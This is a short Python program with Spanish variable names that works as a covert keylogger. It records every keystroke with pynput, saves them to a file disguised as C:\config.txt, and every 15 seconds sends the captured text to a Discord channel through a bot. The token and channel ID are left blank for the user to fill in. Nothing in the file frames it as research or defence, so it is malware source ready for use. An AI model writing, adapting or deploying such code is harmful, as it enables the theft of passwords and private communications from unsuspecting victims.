from pynput import keyboard
import logging
import discord
from discord.ext import commands
import asyncio

logging.disable(logging.CRITICAL)
carpeta_destino = 'C:\\config.txt'
TOKEN = ''
CANAL_ID = 
INTERVALO = 15

logging.disable(logging.CRITICAL)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='/', intents=intents)

queue = asyncio.Queue()

@bot.event
async def on_ready():
    # print(f'Conectado como {bot.user}')
    while True:
        keys = []
        while not queue.empty():
            keys.append(await queue.get())
        if keys:
            canal = bot.get_channel(CANAL_ID)
            await canal.send(''.join(keys))
        await asyncio.sleep(INTERVALO)

def on_press(key):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    try:
        logging.log(10, str(key.char))
        queue.put_nowait(key.char)
    except AttributeError:
        logging.log(10, str(key))
        if key == keyboard.Key.space:
            queue.put_nowait(' ')
        else:
            queue.put_nowait(str(key))

with keyboard.Listener(on_press=on_press) as listener:
    bot.run(TOKEN)
    listener.join()
